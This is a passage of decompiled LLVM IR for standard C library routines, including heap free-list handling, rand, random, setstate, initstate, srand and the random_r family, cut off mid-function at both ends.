  %v2_1000e83c = load i32, i32* %v1_1000e83c, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000e844 = add i32 %v0_1000e83c.lcssa, 8
  %v2_1000e844 = inttoptr i32 %v1_1000e844 to i32*
  %v3_1000e844 = load i32, i32* %v2_1000e844, align 4
  %v2_1000e84c = add i32 %v2_1000e83c, %v2_1000e820
  store i32 %v2_1000e84c, i32* @r29, align 4
  %v5_1000e850 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000e848.lcssa, i32 %v3_1000e844, i32 %v2_1000e7dc)
  store i32 %v5_1000e850, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e8ac

dec_label_pc_1000e858:                            ; preds = %dec_label_pc_1000e81c
  %v1_1000e858 = add i32 %v0_1000e848.lcssa, 4
  %v2_1000e858 = inttoptr i32 %v1_1000e858 to i32*
  %v3_1000e858 = load i32, i32* %v2_1000e858, align 4
  %v3_1000e85c = icmp eq i32 %v3_1000e858, 0
  br i1 %v3_1000e85c, label %dec_label_pc_1000e894, label %dec_label_pc_1000e864

dec_label_pc_1000e864:                            ; preds = %dec_label_pc_1000e858
  %v1_1000e864 = inttoptr i32 %v3_1000e858 to i32*
  %v2_1000e864 = load i32, i32* %v1_1000e864, align 4
  %v2_1000e868 = sub i32 %v3_1000e858, %v2_1000e864
  %v1_1000e86c = add i32 %v2_1000e868, 12
  store i32 %v1_1000e86c, i32* @r9, align 4
  %v4_1000e870 = icmp eq i32 %v2_1000e7dc, %v1_1000e86c
  br i1 %v4_1000e870, label %dec_label_pc_1000e878, label %dec_label_pc_1000e894

dec_label_pc_1000e878:                            ; preds = %dec_label_pc_1000e864
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000e884 = add i32 %v2_1000e864, %v2_1000e820
  store i32 %v2_1000e884, i32* @r29, align 4
  store i32 %v3_1000e858, i32* @r31, align 4
  %v5_1000e88c = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000e858, i32 %v0_1000e83c.lcssa, i32 %v2_1000e7dc)
  store i32 %v5_1000e88c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e8ac

dec_label_pc_1000e894:                            ; preds = %dec_label_pc_1000e864, %dec_label_pc_1000e858
  %v2_1000e894 = add i32 %v0_1000e848.lcssa, %arg3
  store i32 %v2_1000e894, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268495020, i32* @lr, align 4
  %v5_1000e8a8 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000e894, i32 %v0_1000e83c.lcssa, i32 %v3_1000e858)
  store i32 %v5_1000e8a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e8ac

dec_label_pc_1000e8ac:                            ; preds = %dec_label_pc_1000e830, %dec_label_pc_1000e828, %dec_label_pc_1000e878, %dec_label_pc_1000e83c, %dec_label_pc_1000e894
  %v0_1000e8ac = load i32, i32* @r31, align 4
  store i32 %v0_1000e8ac, i32* @r30, align 4
  %v0_1000e8b0 = load i32, i32* @r29, align 4
  %v2_1000e8b0 = inttoptr i32 %v0_1000e8ac to i32*
  store i32 %v0_1000e8b0, i32* %v2_1000e8b0, align 4
  br label %dec_label_pc_1000e8d4

dec_label_pc_1000e8b8:                            ; preds = %dec_label_pc_1000e808, %dec_label_pc_1000e800
  %v2_1000e8b8 = add i32 %v2_1000e7dc, -12
  %v3_1000e8b8 = inttoptr i32 %v2_1000e8b8 to i32*
  store i32 %arg3, i32* %v3_1000e8b8, align 4
  %v0_1000e8bc = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e8bc = add i32 %v0_1000e8bc, -12
  store i32 %v1_1000e8bc, i32* @r30, align 4
  %v0_1000e8c0 = load i32, i32* @r11, align 4
  %v0_1000e8c4 = load i32, i32* @r10, align 4
  store i32 %v0_1000e8c4, i32* %r3.global-to-local, align 4
  %v0_1000e8c8 = load i32, i32* @r31, align 4
  store i32 268495060, i32* @lr, align 4
  %v4_1000e8d0 = inttoptr i32 %v0_1000e8c4 to i32*
  %v5_1000e8d0 = call i32 @__heap_link_free_area(i32* %v4_1000e8d0, i32 %v1_1000e8bc, i32 %v0_1000e8c0, i32 %v0_1000e8c8)
  store i32 %v5_1000e8d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e8d4

dec_label_pc_1000e8d4:                            ; preds = %dec_label_pc_1000e8ac, %dec_label_pc_1000e8b8
  %v0_1000e8d8 = load i32, i32* @r30, align 4
  store i32 %v0_1000e8d8, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e8d8

; uselistorder directives
  uselistorder i32 %v3_1000e858, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000e810, { 1, 0, 2 }
  uselistorder i32 %v0_1000e848.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000e83c.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000e7ec, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000e7dc, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 11, 3, 9, 4, 5, 1, 6, 7, 8, 10, 0 }
  uselistorder i32 -12, { 3, 4, 2, 5, 0, 1 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000e8d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8ac, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000e7e8, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000e8ec = call i32 @random()
  ret i32 %v0_1000e8ec

; uselistorder directives
  uselistorder i32 ()* @random, { 22, 20, 9, 5, 17, 6, 4, 7, 18, 3, 16, 2, 8, 1, 12, 21, 15, 0, 19, 10, 14, 13, 11 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000e904 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1002ee08.439 to i32), i32* @r29, align 4
  %v4_1000e91c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002ee08.439 to i32))
  %v0_1000e920 = load i32, i32* @r29, align 4
  store i32 268495144, i32* @lr, align 4
  %v1_1000e924 = call i32 @pthread_mutex_lock(i32 %v0_1000e920)
  %v2_1000e92c = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000e934 = call i32 @__GI_random_r(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -4576) to i32*), i32 %v2_1000e92c)
  store i32 %v2_1000e904, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268495172, i32* @lr, align 4
  %v0_1000e940 = call i32 @__pthread_cleanup_pop_restore()
  %v3_1000e948 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000e948
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002ee08.439 to i32), i32* %r29.global-to-local, align 4
  %v2_1000e980 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000e988 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002ee08.439 to i32))
  store i32 268495252, i32* @lr, align 4
  %v1_1000e990 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002ee08.439 to i32))
  store i32 268495276, i32* @lr, align 4
  %v3_1000e9a8 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1002ee20)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000e9b0 = icmp slt i32 %v3_1000e9a8, 0
  store i32 1, i32* @r4, align 4
  store i32 %v2_1000e980, i32* @r3, align 4
  br i1 %v1_1000e9b0, label %dec_label_pc_1000e9c4, label %dec_label_pc_1000e9c0

dec_label_pc_1000e9c0:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1002ee24.443 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e9c4

dec_label_pc_1000e9c4:                            ; preds = %entry, %dec_label_pc_1000e9c0
  store i32 268495304, i32* @lr, align 4
  %v0_1000e9c4 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000e9cc = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000e9cc

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000e9c4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000e9f0 = ptrtoint i32* %stack_var_-56 to i32
  %v4_1000ea18 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002ee08.439 to i32))
  store i32 268495396, i32* @lr, align 4
  %v1_1000ea20 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002ee08.439 to i32))
  store i32 %arg1, i32* @r3, align 4
  store i32 268495424, i32* @lr, align 4
  %v4_1000ea3c = inttoptr i32 %arg1 to i32*
  %v5_1000ea3c = call i32 @__GI_initstate_r(i32* %v4_1000ea3c, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1002ee20 to i32))
  store i32 %v2_1000e9f0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268495436, i32* @lr, align 4
  %v0_1000ea48 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 ptrtoint (i32** @global_var_1002ee24.443 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000ea7c = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000ea98 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002ee08.439 to i32))
  store i32 268495524, i32* @lr, align 4
  %v1_1000eaa0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002ee08.439 to i32))
  store i32 ptrtoint (i32* @global_var_1002ee20 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268495540, i32* @lr, align 4
  %v0_1000eab0 = call i32 @srandom_r()
  store i32 %v2_1000ea7c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268495552, i32* @lr, align 4
  %v0_1000eabc = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_1000eabc

; uselistorder directives
  uselistorder i32* @global_var_1002ee20, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ee20 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ee08.439 to i32), { 0, 4, 1, 3, 2, 5, 7, 6, 8 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000ead4 = add i32 %tmp, 12
  %v2_1000ead4 = inttoptr i32 %v1_1000ead4 to i32*
  %v3_1000ead4 = load i32, i32* %v2_1000ead4, align 4
  store i32 %v3_1000ead4, i32* %r11.global-to-local, align 4
  %v0_1000ead8 = load i32, i32* @lr, align 4
  store i32 %v0_1000ead8, i32* %r0.global-to-local, align 4
  %v1_1000eae0 = add i32 %arg1, 4
  store i32 %v1_1000eae0, i32* %r3.global-to-local, align 4
  %v3_1000eae4 = icmp eq i32 %v3_1000ead4, 0
  %v1_1000eae8 = add i32 %tmp, 8
  %v2_1000eae8 = inttoptr i32 %v1_1000eae8 to i32*
  %v3_1000eae8 = load i32, i32* %v2_1000eae8, align 4
  store i32 %v3_1000eae8, i32* %r9.global-to-local, align 4
  br i1 %v3_1000eae4, label %dec_label_pc_1000eaf4, label %dec_label_pc_1000eafc

dec_label_pc_1000eaf4:                            ; preds = %entry
  %v2_1000eaf4 = add i32 %v3_1000eae8, -4
  %v3_1000eaf4 = inttoptr i32 %v2_1000eaf4 to i32*
  store i32 0, i32* %v3_1000eaf4, align 4
  br label %dec_label_pc_1000eb14

dec_label_pc_1000eafc:                            ; preds = %entry
  %v1_1000eafc = add i32 %tmp, 4
  %v2_1000eafc = inttoptr i32 %v1_1000eafc to i32*
  %v3_1000eafc = load i32, i32* %v2_1000eafc, align 4
  %v2_1000eb00 = sub i32 %v3_1000eafc, %v3_1000eae8
  %v4_1000eb04 = sdiv i32 %v2_1000eb00, 4
  %v1_1000eb08 = mul i32 %v4_1000eb04, 5
  %v2_1000eb0c = add i32 %v1_1000eb08, %v3_1000ead4
  store i32 %v2_1000eb0c, i32* %r0.global-to-local, align 4
  %v2_1000eb10 = add i32 %v3_1000eae8, -4
  %v3_1000eb10 = inttoptr i32 %v2_1000eb10 to i32*
  store i32 %v2_1000eb0c, i32* %v3_1000eb10, align 4
  br label %dec_label_pc_1000eb14

dec_label_pc_1000eb14:                            ; preds = %dec_label_pc_1000eaf4, %dec_label_pc_1000eafc
  %v0_1000eb14 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000eb14 = add i32 %v0_1000eb14, -4
  %v2_1000eb14 = inttoptr i32 %v1_1000eb14 to i32*
  %v3_1000eb14 = load i32, i32* %v2_1000eb14, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100198ac.444 to i32), i32* %r9.global-to-local, align 4
  %v2_1000eb24 = srem i32 %v3_1000eb14, 5
  store i32 %v2_1000eb24, i32* %r11.global-to-local, align 4
  %v2_1000eb34 = icmp ugt i32 %v2_1000eb24, 4
  %v1_1000eb38 = mul nsw i32 %v2_1000eb24, 4
  store i32 %v1_1000eb38, i32* %r0.global-to-local, align 4
  br i1 %v2_1000eb34, label %dec_label_pc_1000eba4, label %dec_label_pc_1000eb48

dec_label_pc_1000eb48:                            ; preds = %dec_label_pc_1000eb14
  %v2_1000eb40 = add i32 %v1_1000eb38, ptrtoint (i32* @global_var_100198ac.444 to i32)
  %v3_1000eb3c = icmp eq i32 %v2_1000eb24, 0
  %v1_1000eb48 = add i32 %v1_1000eb38, add (i32 ptrtoint (i32* @global_var_100198ac.444 to i32), i32 20)
  %v2_1000eb48 = inttoptr i32 %v1_1000eb48 to i32*
  %v3_1000eb48 = load i32, i32* %v2_1000eb48, align 4
  store i32 %v3_1000eb48, i32* @r10, align 4
  %v3_1000eb4c = inttoptr i32 %v2_1000eb40 to i32*
  %v4_1000eb4c = load i32, i32* %v3_1000eb4c, align 4
  store i32 %v4_1000eb4c, i32* %r9.global-to-local, align 4
  %v1_1000eb50 = mul i32 %v3_1000eb48, 4
  store i32 %v1_1000eb50, i32* %r0.global-to-local, align 4
  %v2_1000eb54 = add i32 %tmp, 16
  %v3_1000eb54 = inttoptr i32 %v2_1000eb54 to i32*
  store i32 %v3_1000eb48, i32* %v3_1000eb54, align 4
  %v0_1000eb58 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000eb58 = add i32 %tmp, 20
  %v3_1000eb58 = inttoptr i32 %v2_1000eb58 to i32*
  store i32 %v0_1000eb58, i32* %v3_1000eb58, align 4
  %v0_1000eb5c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000eb5c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000eb5c = add i32 %v1_1000eb5c, %v0_1000eb5c
  store i32 %v2_1000eb5c, i32* @r8, align 4
  %v0_1000eb60 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000eb60, i32* %v2_1000ead4, align 4
  br i1 %v3_1000eb3c, label %dec_label_pc_1000eb98, label %dec_label_pc_1000eb68

dec_label_pc_1000eb68:                            ; preds = %dec_label_pc_1000eb48
  %v0_1000eb68 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000eb68 = add i32 %v0_1000eb68, -4
  %v2_1000eb68 = inttoptr i32 %v1_1000eb68 to i32*
  %v3_1000eb68 = load i32, i32* %v2_1000eb68, align 4
  %v1_1000eb6c = load i32, i32* %r7.global-to-local, align 4
  %v2_1000eb6c = sdiv i32 %v3_1000eb68, %v1_1000eb6c
  %v1_1000eb70 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000eb70 = add i32 %v1_1000eb70, %v2_1000eb6c
  store i32 %v2_1000eb70, i32* %r9.global-to-local, align 4
  %v1_1000eb74 = mul i32 %v2_1000eb6c, 4
  %v1_1000eb78 = load i32, i32* @r10, align 4
  %v2_1000eb78 = sdiv i32 %v2_1000eb70, %v1_1000eb78
  store i32 %v2_1000eb78, i32* %r11.global-to-local, align 4
  %v2_1000eb7c = add i32 %v1_1000eb74, %v0_1000eb68
  store i32 %v2_1000eb7c, i32* %r0.global-to-local, align 4
  %v2_1000eb80 = add i32 %tmp, 4
  %v3_1000eb80 = inttoptr i32 %v2_1000eb80 to i32*
  store i32 %v2_1000eb7c, i32* %v3_1000eb80, align 4
  %v0_1000eb84 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eb84 = load i32, i32* @r10, align 4
  %v2_1000eb84 = mul i32 %v1_1000eb84, %v0_1000eb84
  store i32 %v2_1000eb84, i32* %r11.global-to-local, align 4
  %v1_1000eb88 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000eb88 = sub i32 %v1_1000eb88, %v2_1000eb84
  %v1_1000eb8c = mul i32 %v2_1000eb88, 4
  %v0_1000eb90 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000eb90 = add i32 %v1_1000eb8c, %v0_1000eb90
  store i32 %v2_1000eb90, i32* %r9.global-to-local, align 4
  store i32 %v2_1000eb90, i32* %arg2, align 4
  br label %dec_label_pc_1000eb98

dec_label_pc_1000eb98:                            ; preds = %dec_label_pc_1000eb48, %dec_label_pc_1000eb68
  %v0_1000eb98 = load i32, i32* @r8, align 4
  %v2_1000eb98 = add i32 %tmp, 24
  %v3_1000eb98 = inttoptr i32 %v2_1000eb98 to i32*
  store i32 %v0_1000eb98, i32* %v3_1000eb98, align 4
  %v0_1000eb9c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000eb9c, i32* %v2_1000eae8, align 4
  %v0_1000ebb8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000ebb4

dec_label_pc_1000eba4:                            ; preds = %dec_label_pc_1000eb14
  %v0_1000eba4 = call i32 @__errno_location()
  store i32 %v0_1000eba4, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000ebac = inttoptr i32 %v0_1000eba4 to i32*
  store i32 22, i32* %v2_1000ebac, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000ebb4

dec_label_pc_1000ebb4:                            ; preds = %dec_label_pc_1000eb98, %dec_label_pc_1000eba4
  %v0_1000ebb8 = phi i32 [ %v0_1000ebb8.pre, %dec_label_pc_1000eb98 ], [ -1, %dec_label_pc_1000eba4 ]
  store i32 %v0_1000ead8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ebb8, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ebb8

; uselistorder directives
  uselistorder i32 %v0_1000ebb8, { 1, 0 }
  uselistorder i32 %v3_1000eb48, { 1, 0, 2 }
  uselistorder i32 %v1_1000eb38, { 2, 1, 0 }
  uselistorder i32 %v2_1000eb24, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 6, 1, 3, 5, 0, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000ebb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb98, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb14, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000ebc8 = add i32 %tmp, 12
  %v2_1000ebc8 = inttoptr i32 %v1_1000ebc8 to i32*
  %v3_1000ebc8 = load i32, i32* %v2_1000ebc8, align 4
  %v1_1000ebd4 = add i32 %tmp, 8
  %v2_1000ebd4 = inttoptr i32 %v1_1000ebd4 to i32*
  %v3_1000ebd4 = load i32, i32* %v2_1000ebd4, align 4
  store i32 %v3_1000ebd4, i32* %r7.global-to-local, align 4
  %v3_1000ebd8 = icmp eq i32 %v3_1000ebc8, 0
  br i1 %v3_1000ebd8, label %dec_label_pc_1000ebe0, label %dec_label_pc_1000ebfc

dec_label_pc_1000ebe0:                            ; preds = %entry
  %v1_1000ebe0 = inttoptr i32 %v3_1000ebd4 to i32*
  %v2_1000ebe0 = load i32, i32* %v1_1000ebe0, align 4
  %v2_1000ebe4 = mul i32 %v2_1000ebe0, 1103515245
  %v1_1000ebe8 = add i32 %v2_1000ebe4, 12345
  %v1_1000ebec = urem i32 %v1_1000ebe8, -2147483648
  store i32 %v1_1000ebec, i32* %r9.global-to-local, align 4
  store i32 %v1_1000ebec, i32* %v1_1000ebe0, align 4
  %v0_1000ebf4 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000ebf4 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000ebf4, i32* %v2_1000ebf4, align 4
  br label %dec_label_pc_1000ec50

dec_label_pc_1000ebfc:                            ; preds = %entry
  %v2_1000ebfc = load i32, i32* %arg1, align 4
  %v1_1000ec00 = add i32 %tmp, 4
  %v2_1000ec00 = inttoptr i32 %v1_1000ec00 to i32*
  %v3_1000ec00 = load i32, i32* %v2_1000ec00, align 4
  store i32 %v3_1000ec00, i32* %r9.global-to-local, align 4
  %v1_1000ec04 = add i32 %tmp, 24
  %v2_1000ec04 = inttoptr i32 %v1_1000ec04 to i32*
  %v3_1000ec04 = load i32, i32* %v2_1000ec04, align 4
  %v1_1000ec08 = add i32 %v2_1000ebfc, 4
  store i32 %v1_1000ec08, i32* @r8, align 4
  %v1_1000ec0c = add i32 %v3_1000ec00, 4
  %v1_1000ec10 = inttoptr i32 %v3_1000ec00 to i32*
  %v2_1000ec10 = load i32, i32* %v1_1000ec10, align 4
  store i32 %v2_1000ec10, i32* %r9.global-to-local, align 4
  %v2_1000ec14 = icmp ult i32 %v1_1000ec08, %v3_1000ec04
  %v1_1000ec1c = inttoptr i32 %v2_1000ebfc to i32*
  %v2_1000ec1c = load i32, i32* %v1_1000ec1c, align 4
  store i32 %v1_1000ec0c, i32* @r10, align 4
  %v2_1000ec24 = add i32 %v2_1000ec1c, %v2_1000ec10
  %v1_1000ec28 = udiv i32 %v2_1000ec24, 2
  store i32 %v1_1000ec28, i32* %r9.global-to-local, align 4
  store i32 %v2_1000ec24, i32* %v1_1000ec1c, align 4
  %v0_1000ec30 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000ec30 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000ec30, i32* %v2_1000ec30, align 4
  br i1 %v2_1000ec14, label %dec_label_pc_1000ec40, label %dec_label_pc_1000ec38

dec_label_pc_1000ec38:                            ; preds = %dec_label_pc_1000ebfc
  %v0_1000ec38 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000ec38, i32* @r8, align 4
  br label %dec_label_pc_1000ec48

dec_label_pc_1000ec40:                            ; preds = %dec_label_pc_1000ebfc
  %v2_1000ec18 = icmp ult i32 %v1_1000ec0c, %v3_1000ec04
  br i1 %v2_1000ec18, label %dec_label_pc_1000ec48, label %dec_label_pc_1000ec44

dec_label_pc_1000ec44:                            ; preds = %dec_label_pc_1000ec40
  %v0_1000ec44 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000ec44, i32* @r10, align 4
  br label %dec_label_pc_1000ec48

dec_label_pc_1000ec48:                            ; preds = %dec_label_pc_1000ec40, %dec_label_pc_1000ec38, %dec_label_pc_1000ec44
  %v0_1000ec48 = load i32, i32* @r10, align 4
  store i32 %v0_1000ec48, i32* %v2_1000ec00, align 4
  %v0_1000ec4c = load i32, i32* @r8, align 4
  store i32 %v0_1000ec4c, i32* %arg1, align 4
  br label %dec_label_pc_1000ec50

dec_label_pc_1000ec50:                            ; preds = %dec_label_pc_1000ebe0, %dec_label_pc_1000ec48
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000ec24, { 1, 0 }
  uselistorder i32 %v1_1000ec0c, { 1, 0 }
  uselistorder i32 %v3_1000ec00, { 1, 0, 2 }
  uselistorder i32 %v1_1000ebec, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000ec50, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec48, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000ec58 = load i32, i32* @lr, align 4
  %v0_1000ec64 = load i32, i32* @r4, align 4
  store i32 %v0_1000ec64, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000ec70 = add i32 %v0_1000ec64, 12
  %v2_1000ec70 = inttoptr i32 %v1_1000ec70 to i32*
  %v3_1000ec70 = load i32, i32* %v2_1000ec70, align 4
  %v2_1000ec74 = icmp ugt i32 %v3_1000ec70, 4
  br i1 %v2_1000ec74, label %dec_label_pc_1000ed24, label %dec_label_pc_1000ec7c

dec_label_pc_1000ec7c:                            ; preds = %entry
  %v0_1000ec7c = load i32, i32* @r3, align 4
  %v3_1000ec7c = icmp eq i32 %v0_1000ec7c, 0
  %v1_1000ec80 = add i32 %v0_1000ec64, 8
  %v2_1000ec80 = inttoptr i32 %v1_1000ec80 to i32*
  %v3_1000ec80 = load i32, i32* %v2_1000ec80, align 4
  store i32 %v3_1000ec80, i32* @r10, align 4
  br i1 %v3_1000ec7c, label %dec_label_pc_1000ec88, label %dec_label_pc_1000ec8c

dec_label_pc_1000ec88:                            ; preds = %dec_label_pc_1000ec7c
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000ec8c

dec_label_pc_1000ec8c:                            ; preds = %dec_label_pc_1000ec7c, %dec_label_pc_1000ec88
  %v0_1000ec90 = phi i32 [ %v0_1000ec7c, %dec_label_pc_1000ec7c ], [ 1, %dec_label_pc_1000ec88 ]
  %v3_1000ec8c = icmp eq i32 %v3_1000ec70, 0
  %v2_1000ec90 = inttoptr i32 %v3_1000ec80 to i32*
  store i32 %v0_1000ec90, i32* %v2_1000ec90, align 4
  br i1 %v3_1000ec8c, label %dec_label_pc_1000ed20, label %dec_label_pc_1000ec98

dec_label_pc_1000ec98:                            ; preds = %dec_label_pc_1000ec8c
  %v0_1000ec98 = load i32, i32* @r30, align 4
  %v1_1000ec98 = add i32 %v0_1000ec98, 16
  %v2_1000ec98 = inttoptr i32 %v1_1000ec98 to i32*
  %v3_1000ec98 = load i32, i32* %v2_1000ec98, align 4
  store i32 %v3_1000ec98, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000ecb0 = load i32, i32* @r10, align 4
  store i32 %v3_1000ec98, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000ec98, 0
  br i1 %tmp18, label %dec_label_pc_1000ecec.preheader, label %dec_label_pc_1000ecec.preheader.thread

dec_label_pc_1000ecec.preheader.thread:           ; preds = %dec_label_pc_1000ec98
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ecf0

dec_label_pc_1000ecec.preheader:                  ; preds = %dec_label_pc_1000ec98
  %v1_1000ecec2 = add i32 %v3_1000ec98, -1
  store i32 %v1_1000ecec2, i32* %ctr.global-to-local, align 4
  %v2_1000ecec3 = icmp eq i32 %v1_1000ecec2, 0
  br i1 %v2_1000ecec3, label %dec_label_pc_1000ecf0, label %dec_label_pc_1000ecc8

dec_label_pc_1000ecc8:                            ; preds = %dec_label_pc_1000ecec.preheader, %dec_label_pc_1000ece8.dec_label_pc_1000ecc8_crit_edge
  %v1_1000ece8 = phi i32 [ %v2_1000ece8, %dec_label_pc_1000ece8.dec_label_pc_1000ecc8_crit_edge ], [ %v0_1000ecb0, %dec_label_pc_1000ecec.preheader ]
  %v1_1000ecc8 = phi i32 [ %v1_1000ecc8.pre, %dec_label_pc_1000ece8.dec_label_pc_1000ecc8_crit_edge ], [ 127773, %dec_label_pc_1000ecec.preheader ]
